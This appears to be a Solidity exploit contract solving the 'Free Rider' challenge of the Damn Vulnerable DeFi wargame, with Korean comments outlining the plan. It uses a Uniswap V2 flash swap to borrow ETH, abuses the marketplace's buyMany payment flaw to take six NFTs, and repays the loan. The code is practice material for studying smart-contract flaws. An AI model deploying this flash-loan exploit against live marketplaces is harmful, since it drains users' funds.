pragma solidity =0.8.25;
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {FreeRiderNFTMarketplace} from "./FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


/*
    flashswap을 통해 대출한다. 30 ether
    buymany취약점을 통해 다수의 nft 6개를 구매한다. (취약점1)
    buymany를 통해 내 토큰 6개를 다시 구매한다.  (이더를 받음 - 취약점2)
    대출을 갚는다. 
    토큰을 전달한다. 
*/

interface IFreeRiderNFTMarket{
        function buyMany(uint256[] calldata tokenIds) external payable; 
}



contract RiderAttacker is IERC721Receiver {
    IUniswapV2Factory factory;
    IFreeRiderNFTMarket market;
    address recoveryManager;
    DamnValuableNFT token;
    WETH weth;
    address  pairAddress;
    address dvt;
    address payable player;


    constructor(address _uniswapFactory, address _market, address _recoverymanager, address _token, address payable _weth, address _dvt) payable{
        dvt = _dvt;
        factory = IUniswapV2Factory(_uniswapFactory);
        market = IFreeRiderNFTMarket(_market);
        recoveryManager = _recoverymanager;
        token = DamnValuableNFT(_token);
        weth = WETH(_weth);
        player = payable(msg.sender);
        //weth.deposit{value:0.1 ether}();
    }

    function attack() external payable{
        address pair = factory.getPair(address(dvt),address(weth));
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = address(weth)==token0 ? 15 ether :0;
        uint256 amount1Out = address(weth)==token1 ? 15 ether :0;
        pairAddress = address(pair);

        IUniswapV2Pair(pair).swap(amount0Out,amount1Out,address(this),abi.encode("flashloan"));
        player.transfer(address(this).balance);
        
    }

      function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        require(msg.sender == pairAddress,"Not Authorized");
        uint256[] memory tokenIds = new uint256[](6);
        for(uint256 i=0; i<6; i++){
            tokenIds[i] = i;
        }
        weth.withdraw(15 ether);
        //token.setApprovalForAll(address(market), true);
        market.buyMany{value: 15 ether}(tokenIds);
        for(uint256 i=0; i<6; i++){
            //token.approve(address(this), i);
            //require(token.ownerOf(tokenIds[i]) == address(this), "Not the owner of token");
            token.safeTransferFrom(address(this),recoveryManager,i,abi.encode(address(this)));
        }
    

        uint256 amountBorrowed = amount0 > 0 ? amount0 : amount1;
        // Logic for using the borrowed Ether (e.g., arbitrage, liquidation, etc.)
        // For demonstration, we wrap the borrowed Ether into WETH
        //IWETH(weth).deposit{value: amountBorrowed}();

        // Calculate and pay the fee for the Flash Swap
        uint256 fee = ((amountBorrowed * 3) / 997) + 1; // Uniswap fee (0.3%)
        uint256 totalRepayment = amountBorrowed + fee;
        weth.deposit{value:totalRepayment}();
        weth.transfer(msg.sender, totalRepayment);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // 토큰 수신 시 필요한 작업 수행 (예: 이벤트 기록)
       // emit TokenReceived(operator, from, tokenId, data);

        // ERC721Receiver 인터페이스에서 요구하는 반환값
        return this.onERC721Received.selector;
    }

    // 토큰 수신 이벤트
    //event TokenReceived(address operator, address from, uint256 tokenId, bytes data);

    receive() external payable {}
}